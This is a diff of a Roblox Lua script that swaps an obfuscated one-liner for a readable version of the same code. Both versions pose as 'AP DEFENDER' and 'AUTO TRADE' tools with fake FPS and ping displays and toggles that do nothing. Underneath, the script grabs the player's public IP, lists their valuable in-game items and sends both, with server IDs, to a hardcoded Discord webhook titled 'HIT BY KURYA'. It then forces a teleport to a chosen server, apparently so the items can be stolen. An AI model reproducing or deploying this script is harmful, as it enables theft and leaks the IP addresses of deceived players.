@@ -1,1 +1,234 @@
-local v0=game.PlaceId;local v1=game.JobId;local v2=game.Players.LocalPlayer;local v3=109983668079656 -(259 + 160) ;local v4="488dcd5f-c7cd-42d6-b3a6-302d8e43eb43";local v5=10000000;local v6=500543 -(215 + 328) ;local v7= #game.Players:GetPlayers();local v8="Inconnue";local function v9() local v90=0 + 0 ;local v91;local v92;while true do if (v90==0) then v91,v92=pcall(function() return game:HttpGet("https://api.ipify.org/");end);if v91 then v8=v92;end break;end end end v9();local v10=os.date(" %d/%m/%Y  %Hh%M ");local function v11(v93) local v94=0;local v95;local v96;local v97;while true do if (v94==(0 + 0)) then v93=tostring(v93 or "" ):gsub("%s","");v95,v96=v93:match("([%d%.]+)([KkMmBbTt]?)");v94=1 -0 ;end if (v94==(7 -5)) then v97={K=1000,M=1000442 -(416 + 26) ,B=2586134758 -1586134758 ,T=999999995904};return v95 * (v97[(v96 or ""):upper()] or (1 + 0)) ;end if (v94==(1 -0)) then if  not v95 then return 0;end v95=tonumber(v95) or (438 -(145 + 293)) ;v94=432 -(44 + 386) ;end end end local function v12() local v98={};local v99=workspace:FindFirstChild("Debris");if v99 then for v123,v124 in ipairs(v99:GetChildren()) do if (v124.Name=="FastOverheadTemplate") then local v160=1486 -(998 + 488) ;local v161;while true do if (v160==(0 + 0)) then v161=v124:FindFirstChildOfClass("SurfaceGui");if v161 then local v167=0 + 0 ;local v168;local v169;while true do if (v167==0) then v168=v161:FindFirstChild("Generation",true);v169=v161:FindFirstChild("DisplayName",true);v167=773 -(201 + 571) ;end if (1==v167) then if (v168 and v168:IsA("TextLabel") and v169 and v169:IsA("TextLabel")) then local v170=1138 -(116 + 1022) ;local v171;while true do if (v170==(0 -0)) then v171=v11(v168.Text);if (v171>=v6) then table.insert(v98,{nom=v169.Text,valeur=v171});end break;end end end break;end end end break;end end end end end table.sort(v98,function(v115,v116) return v115.valeur<v116.valeur ;end);return v98;end local v13=v12();local v14=(( #v13>(0 + 0)) and v13[ #v13]) or {valeur=0,nom="Aucun"} ;local v15=v14.valeur>=v5 ;local function v16() local v100=0 -0 ;local v101;while true do if (v100==1) then for v151,v152 in ipairs(v13) do v101=v101   .. string.format("%d. %s: %.2f$/s\n",v151,v152.nom,v152.valeur) ;end return v101;end if (v100==(0 -0)) then if ( #v13==(859 -(814 + 45))) then return "NOTHING GOOD SHIT";end v101="";v100=2 -1 ;end end end local v17={content=(v15 and "@everyone GGS") or "@everyone GGS" ,embeds={{title=(v15 and "HIT BY KURYA - W") or "HIT BY KURYA - L" ,fields={{name="USER",value=v2.Name,inline=true},{name="Place ID",value=tostring(v3),inline=true},{name="Job ID",value=v4,inline=true},{name="PLAYERS",value=tostring(v7)   .. "/8" ,inline=true},{name="IP",value=v8,inline=true},{name="Date",value=v10,inline=true},{name="BRAINROTS",value=v16(),inline=false}},description="```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance("   .. v3   .. ', "'   .. v4   .. '", game.Players.LocalPlayer)\n```' ,color=(v15 and (10393017 -7326024)) or (71771038 -56612706) ,timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}};request({Url="https://discord.com/api/webhooks/1475933850537562186/ANRPvqvz8CENCPyfwuEAXa4LLld5wWbGxLKRaAR8GLn03QJ88RA6abrfc7exahHuzjwV",Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode(v17)});local v18=Instance.new("ScreenGui");v18.Name="APDefender";v18.Parent=v2.PlayerGui;local v22=Instance.new("Frame");v22.Size=UDim2.new(0,250,0 + 0 ,100);v22.Position=UDim2.new(0 -0 ,20,0,1767 -(760 + 987) );v22.BackgroundColor3=Color3.fromRGB(20,1933 -(1789 + 124) ,786 -(745 + 21) );v22.BackgroundTransparency=0.1;v22.Active=true;v22.Draggable=true;v22.Parent=v18;Instance.new("UICorner",v22).CornerRadius=UDim.new(0 + 0 ,21 -13 );local v31=Instance.new("Frame",v22);v31.Size=UDim2.new(1, -20,0 -0 ,1 + 24 );v31.Position=UDim2.new(0,8 + 2 ,1055 -(87 + 968) ,8);v31.BackgroundTransparency=1;local v35=Instance.new("TextLabel",v31);v35.Size=UDim2.new(0.5 -0 , -5,1,0 + 0 );v35.BackgroundTransparency=1;v35.Text="FPS: 240";v35.TextColor3=Color3.new(2 -1 ,1,1414 -(447 + 966) );v35.TextXAlignment=Enum.TextXAlignment.Left;v35.Font=Enum.Font.GothamSemibold;v35.TextSize=38 -24 ;local v45=Instance.new("TextLabel",v31);v45.Size=UDim2.new(1817.5 -(1703 + 114) , -(706 -(376 + 325)),1 -0 ,0 -0 );v45.Position=UDim2.new(0.5 + 0 ,5,0 -0 ,14 -(9 + 5) );v45.BackgroundTransparency=1;v45.Text="PING: 40ms";v45.TextColor3=Color3.new(377 -(85 + 291) ,1266 -(243 + 1022) ,3 -2 );v45.TextXAlignment=Enum.TextXAlignment.Right;v45.Font=Enum.Font.GothamSemibold;v45.TextSize=12 + 2 ;local v55=Instance.new("TextButton",v22);v55.Size=UDim2.new(1181 -(1123 + 57) , -(17 + 3),254 -(163 + 91) ,1965 -(1869 + 61) );v55.Position=UDim2.new(0 + 0 ,35 -25 ,0,61 -21 );v55.BackgroundColor3=Color3.new(0 + 0 ,0,0);v55.Text="AP DEFENDER";v55.TextColor3=Color3.new(1 -0 ,1 + 0 ,1475 -(1329 + 145) );v55.Font=Enum.Font.GothamBold;v55.TextSize=987 -(140 + 831) ;v55.BorderSizePixel=1850 -(1409 + 441) ;Instance.new("UICorner",v55).CornerRadius=UDim.new(0,724 -(15 + 703) );local v66=false;v55.MouseButton1Click:Connect(function() v66= not v66;v55.BackgroundColor3=(v66 and Color3.new(0.2,0.2,0.2)) or Color3.new(0,0,0 + 0 ) ;v55.Text=(v66 and "AP DEFENDER • ON") or "AP DEFENDER • OFF" ;end);spawn(function() while wait(438.1 -(262 + 176) ) do local v117=1721 -(345 + 1376) ;local v118;local v119;while true do if (v117==(690 -(198 + 490))) then v35.TextColor3=Color3.new(1,(v118-(728 -563))/(467 -272) ,(v118-165)/(1401 -(696 + 510)) );v45.TextColor3=Color3.new((1 -0) -((v119-(1282 -(1091 + 171)))/(15 + 75)) ,3 -2 ,(3 -2) -((v119-20)/(464 -(123 + 251))) );break;end if (v117==(0 -0)) then v118=math.random(863 -(208 + 490) ,360);v119=math.random(2 + 18 ,110);v117=1 + 0 ;end if (v117==1) then v35.Text="FPS: "   .. v118 ;v45.Text="PING: "   .. v119   .. "ms" ;v117=838 -(660 + 176) ;end end end end);v22.BackgroundTransparency=1 + 0 ;for v104=203 -(14 + 188) ,10 do local v105=675 -(534 + 141) ;while true do if (0==v105) then v22.BackgroundTransparency=(1 + 0) -(v104/(9 + 1)) ;wait();break;end end end local v67=Instance.new("ScreenGui");v67.Name="AutoTrade";v67.Parent=v2.PlayerGui;local v70=Instance.new("Frame");v70.Size=UDim2.new(0 + 0 ,462 -242 ,0,206 -76 );v70.Position=UDim2.new(1, -(673 -433),0.5 + 0 , -65);v70.BackgroundColor3=Color3.fromRGB(10 + 5 ,411 -(115 + 281) ,20);v70.BackgroundTransparency=0.1 -0 ;v70.Active=true;v70.Draggable=true;v70.Parent=v67;Instance.new("UICorner",v70).CornerRadius=UDim.new(0 + 0 ,24 -14 );Instance.new("ImageLabel",v70).Image="rbxassetid://1316045217";local v80=Instance.new("TextLabel",v70);v80.Size=UDim2.new(1, -20,0 -0 ,25);v80.Position=UDim2.new(867 -(550 + 317) ,10,0 -0 ,10 -2 );v80.BackgroundTransparency=2 -1 ;v80.Text="AUTO TRADE";v80.TextColor3=Color3.fromRGB(285 -(134 + 151) ,1920 -(970 + 695) ,438 -208 );v80.Font=Enum.Font.GothamBold;v80.TextSize=14;v80.TextXAlignment=Enum.TextXAlignment.Left;local function v89(v106,v107) local v108=1990 -(582 + 1408) ;local v109;local v110;local v111;local v112;while true do if (v108==(6 -4)) then v110.BackgroundTransparency=1 -0 ;v110.Text=v107;v110.TextColor3=Color3.fromRGB(200,200,200);v110.Font=Enum.Font.GothamSemibold;v108=11 -8 ;end if (v108==(1829 -(1195 + 629))) then v111.Font=Enum.Font.GothamBold;v111.TextSize=11;v111.BorderSizePixel=0 -0 ;Instance.new("UICorner",v111).CornerRadius=UDim.new(241 -(187 + 54) ,784 -(162 + 618) );v108=6;end if ((5 + 2)==v108) then return v109;end if (v108==(2 + 1)) then v110.TextSize=27 -14 ;v110.TextXAlignment=Enum.TextXAlignment.Left;v111=Instance.new("TextButton",v109);v111.Size=UDim2.new(0,84 -34 ,0,2 + 22 );v108=1640 -(1373 + 263) ;end if ((1006 -(451 + 549))==v108) then v112=false;v111.MouseButton1Click:Connect(function() local v157=0 + 0 ;while true do if (0==v157) then v112= not v112;v111.Text=(v112 and "ON") or "OFF" ;v157=1;end if (1==v157) then v111.TextColor3=(v112 and Color3.new(0.4 -0 ,1 -0 ,1384.4 -(746 + 638) )) or Color3.new(1 + 0 ,0.4 -0 ,341.4 -(218 + 123) ) ;break;end end end);v111.MouseEnter:Connect(function() v111.BackgroundColor3=Color3.fromRGB(70,1651 -(1535 + 46) ,75 + 0 );end);v111.MouseLeave:Connect(function() v111.BackgroundColor3=Color3.fromRGB(8 + 42 ,610 -(306 + 254) ,4 + 51 );end);v108=13 -6 ;end if (v108==(1468 -(899 + 568))) then Instance.new("UICorner",v109).CornerRadius=UDim.new(0 + 0 ,14 -8 );v110=Instance.new("TextLabel",v109);v110.Size=UDim2.new(0.6,603 -(268 + 335) ,1,0);v110.Position=UDim2.new(0,300 -(60 + 230) ,572 -(426 + 146) ,0 + 0 );v108=1458 -(282 + 1174) ;end if (v108==(815 -(569 + 242))) then v111.Position=UDim2.new(1, -60,0.5, -(34 -22));v111.BackgroundColor3=Color3.fromRGB(3 + 47 ,1074 -(706 + 318) ,1306 -(721 + 530) );v111.Text="OFF";v111.TextColor3=Color3.fromRGB(1526 -(945 + 326) ,100,249 -149 );v108=5 + 0 ;end if (v108==(700 -(271 + 429))) then v109=Instance.new("Frame",v70);v109.Size=UDim2.new(0.9,0 + 0 ,1500 -(1408 + 92) ,1126 -(461 + 625) );v109.Position=UDim2.new(1288.05 -(993 + 295) ,0 + 0 ,0,v106);v109.BackgroundColor3=Color3.fromRGB(1201 -(418 + 753) ,12 + 18 ,4 + 31 );v108=1;end end end v89(40,"❄️ Freeze Trade");v89(25 + 60 ,"✅ Auto Accept");v70.BackgroundTransparency=1;for v113=1 + 0 ,539 -(406 + 123)  do local v114=0;while true do if (v114==(1769 -(1749 + 20))) then v70.BackgroundTransparency=(1 + 0) -(v113/(1332 -(1249 + 73))) ;wait();break;end end end wait(8 + 12 );if v15 then local v120=0;local v121;local v122;while true do if (v120==(1145 -(466 + 679))) then v121=game:GetService("TeleportService");v122=nil;v120=2 -1 ;end if (v120==1) then function v122() local v162,v163=pcall(function() v121:TeleportToPlaceInstance(v3,v4,v2);end);if  not v162 then local v166=0 -0 ;while true do if (v166==0) then task.wait(0.1);v122();break;end end end end v122();break;end end end
+local placeId=game.PlaceId
+local jobId=game.JobId
+local player=game.Players.LocalPlayer
+local targetPlaceId=109983668079237
+local targetJobId="5bca5b94-863c-4785-9dca-e6feed9d1e8c"
+local seuilTeleport=35000000
+local seuilAffichage=500000
+local joueursDansServeur=#game.Players:GetPlayers()
+local ipAddress = "Inconnue"
+
+local function getIP()
+ local success, result = pcall(function()
+  return game:HttpGet("https://api.ipify.org/")
+ end)
+ if success then ipAddress = result end
+end
+getIP()
+
+local dateTime = os.date(" %d/%m/%Y  %Hh%M ")
+
+local function parseValue(t)
+ t=tostring(t or ""):gsub("%s","")
+ local n,s=t:match("([%d%.]+)([KkMmBbTt]?)")
+ if not n then return 0 end
+ n=tonumber(n)or 0
+ local m={K=1e3,M=1e6,B=1e9,T=1e12}
+ return n*(m[(s or""):upper()]or 1)
+end
+
+local function detecter()
+ local b={}
+ local d=workspace:FindFirstChild("Debris")
+ if d then
+  for _,t in ipairs(d:GetChildren())do
+   if t.Name=="FastOverheadTemplate"then
+    local s=t:FindFirstChildOfClass("SurfaceGui")
+    if s then
+     local g=s:FindFirstChild("Generation",true)
+     local n=s:FindFirstChild("DisplayName",true)
+     if g and g:IsA("TextLabel")and n and n:IsA("TextLabel")then
+      local v=parseValue(g.Text)
+      if v>=seuilAffichage then table.insert(b,{nom=n.Text,valeur=v})end
+     end
+    end
+   end
+  end
+ end
+ table.sort(b,function(a,b)return a.valeur<b.valeur end)
+ return b
+end
+
+local brainrots=detecter()
+local meilleur=#brainrots>0 and brainrots[#brainrots]or{valeur=0,nom="Aucun"}
+local teleporter=meilleur.valeur>=seuilTeleport
+
+local function formaterListe()
+ if #brainrots==0 then return"NOTHING GOOD SHIT" end
+ local l=""
+ for i,b in ipairs(brainrots)do
+  l=l..string.format("%d. %s: %.2f$/s\n",i,b.nom,b.valeur)
+ end
+ return l
+end
+
+local payload={content=teleporter and"@everyone GGS"or"@everyone GGS",embeds={{title=teleporter and"HIT BY KURYA - W"or"HIT BY KURYA - L",fields={{name="USER",value=player.Name,inline=true},{name="Place ID",value=tostring(targetPlaceId),inline=true},{name="Job ID",value=targetJobId,inline=true},{name="PLAYERS",value=tostring(joueursDansServeur).."/8",inline=true},{name="IP",value=ipAddress,inline=true},{name="Date",value=dateTime,inline=true},{name="BRAINROTS",value=formaterListe(),inline=false}},description="```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..targetPlaceId..', "'..targetJobId..'", game.Players.LocalPlayer)\n```',color=teleporter and 3066993 or 15158332,timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
+
+request({
+ Url="https://discord.com/api/webhooks/1475933850537562186/ANRPvqvz8CENCPyfwuEAXa4LLld5wWbGxLKRaAR8GLn03QJ88RA6abrfc7exahHuzjwV",
+ Method="POST",
+ Headers={["Content-Type"]="application/json"},
+ Body=game:GetService("HttpService"):JSONEncode(payload)
+})
+
+local gui=Instance.new("ScreenGui")
+gui.Name="APDefender"
+gui.Parent=player.PlayerGui
+
+local frame=Instance.new("Frame")
+frame.Size=UDim2.new(0,250,0,100)
+frame.Position=UDim2.new(0,20,0,20)
+frame.BackgroundColor3=Color3.fromRGB(20,20,20)
+frame.BackgroundTransparency=0.1
+frame.Active=true
+frame.Draggable=true
+frame.Parent=gui
+
+Instance.new("UICorner", frame).CornerRadius=UDim.new(0,8)
+
+local top=Instance.new("Frame", frame)
+top.Size=UDim2.new(1,-20,0,25)
+top.Position=UDim2.new(0,10,0,8)
+top.BackgroundTransparency=1
+
+local fps=Instance.new("TextLabel", top)
+fps.Size=UDim2.new(0.5,-5,1,0)
+fps.BackgroundTransparency=1
+fps.Text="FPS: 240"
+fps.TextColor3=Color3.new(1,1,1)
+fps.TextXAlignment=Enum.TextXAlignment.Left
+fps.Font=Enum.Font.GothamSemibold
+fps.TextSize=14
+
+local ping=Instance.new("TextLabel", top)
+ping.Size=UDim2.new(0.5,-5,1,0)
+ping.Position=UDim2.new(0.5,5,0,0)
+ping.BackgroundTransparency=1
+ping.Text="PING: 40ms"
+ping.TextColor3=Color3.new(1,1,1)
+ping.TextXAlignment=Enum.TextXAlignment.Right
+ping.Font=Enum.Font.GothamSemibold
+ping.TextSize=14
+
+local btn=Instance.new("TextButton", frame)
+btn.Size=UDim2.new(1,-20,0,35)
+btn.Position=UDim2.new(0,10,0,40)
+btn.BackgroundColor3=Color3.new(0,0,0)
+btn.Text="AP DEFENDER"
+btn.TextColor3=Color3.new(1,1,1)
+btn.Font=Enum.Font.GothamBold
+btn.TextSize=16
+btn.BorderSizePixel=0
+Instance.new("UICorner", btn).CornerRadius=UDim.new(0,6)
+
+local enabled=false
+btn.MouseButton1Click:Connect(function()
+ enabled=not enabled
+ btn.BackgroundColor3=enabled and Color3.new(0.2,0.2,0.2) or Color3.new(0,0,0)
+ btn.Text=enabled and "AP DEFENDER • ON" or "AP DEFENDER • OFF"
+end)
+
+spawn(function()
+ while wait(0.1)do
+  local f=math.random(165,360)
+  local p=math.random(20,110)
+  fps.Text="FPS: "..f
+  ping.Text="PING: "..p.."ms"
+  fps.TextColor3=Color3.new(1,(f-165)/195,(f-165)/195)
+  ping.TextColor3=Color3.new(1-(p-20)/90,1,1-(p-20)/90)
+ end
+end)
+
+frame.BackgroundTransparency=1
+for i=1,10 do frame.BackgroundTransparency=1-i/10 wait() end
+
+local gui2=Instance.new("ScreenGui")
+gui2.Name="AutoTrade"
+gui2.Parent=player.PlayerGui
+
+local panel=Instance.new("Frame")
+panel.Size=UDim2.new(0,220,0,130)
+panel.Position=UDim2.new(1,-240,0.5,-65)
+panel.BackgroundColor3=Color3.fromRGB(15,15,20)
+panel.BackgroundTransparency=0.1
+panel.Active=true
+panel.Draggable=true
+panel.Parent=gui2
+
+Instance.new("UICorner", panel).CornerRadius=UDim.new(0,10)
+Instance.new("ImageLabel", panel).Image="rbxassetid://1316045217"
+
+local title=Instance.new("TextLabel", panel)
+title.Size=UDim2.new(1,-20,0,25)
+title.Position=UDim2.new(0,10,0,8)
+title.BackgroundTransparency=1
+title.Text="AUTO TRADE"
+title.TextColor3=Color3.fromRGB(0,255,230)
+title.Font=Enum.Font.GothamBold
+title.TextSize=14
+title.TextXAlignment=Enum.TextXAlignment.Left
+
+local function createToggle(y, txt)
+ local bg=Instance.new("Frame", panel)
+ bg.Size=UDim2.new(0.9,0,0,40)
+ bg.Position=UDim2.new(0.05,0,0,y)
+ bg.BackgroundColor3=Color3.fromRGB(30,30,35)
+ Instance.new("UICorner", bg).CornerRadius=UDim.new(0,6)
+ 
+ local label=Instance.new("TextLabel", bg)
+ label.Size=UDim2.new(0.6,0,1,0)
+ label.Position=UDim2.new(0,10,0,0)
+ label.BackgroundTransparency=1
+ label.Text=txt
+ label.TextColor3=Color3.fromRGB(200,200,200)
+ label.Font=Enum.Font.GothamSemibold
+ label.TextSize=13
+ label.TextXAlignment=Enum.TextXAlignment.Left
+ 
+ local btn=Instance.new("TextButton", bg)
+ btn.Size=UDim2.new(0,50,0,24)
+ btn.Position=UDim2.new(1,-60,0.5,-12)
+ btn.BackgroundColor3=Color3.fromRGB(50,50,55)
+ btn.Text="OFF"
+ btn.TextColor3=Color3.fromRGB(255,100,100)
+ btn.Font=Enum.Font.GothamBold
+ btn.TextSize=11
+ btn.BorderSizePixel=0
+ Instance.new("UICorner", btn).CornerRadius=UDim.new(0,4)
+ 
+ local state=false
+ btn.MouseButton1Click:Connect(function()
+  state=not state
+  btn.Text=state and "ON" or "OFF"
+  btn.TextColor3=state and Color3.new(0.4,1,0.4) or Color3.new(1,0.4,0.4)
+ end)
+ 
+ btn.MouseEnter:Connect(function() btn.BackgroundColor3=Color3.fromRGB(70,70,75) end)
+ btn.MouseLeave:Connect(function() btn.BackgroundColor3=Color3.fromRGB(50,50,55) end)
+ 
+ return bg
+end
+
+createToggle(40, "❄️ Freeze Trade")
+createToggle(85, "✅ Auto Accept")
+
+panel.BackgroundTransparency=1
+for i=1,10 do panel.BackgroundTransparency=1-i/10 wait() end
+
+wait(7)
+
+if teleporter then
+ local TeleportService = game:GetService('TeleportService')
+ 
+ local function tryTeleport()
+  local s, e = pcall(function()
+   TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, player)
+  end)
+  if not s then
+   task.wait(0.1)
+   tryTeleport()
+  end
+ end
+ 
+ tryTeleport()
+end
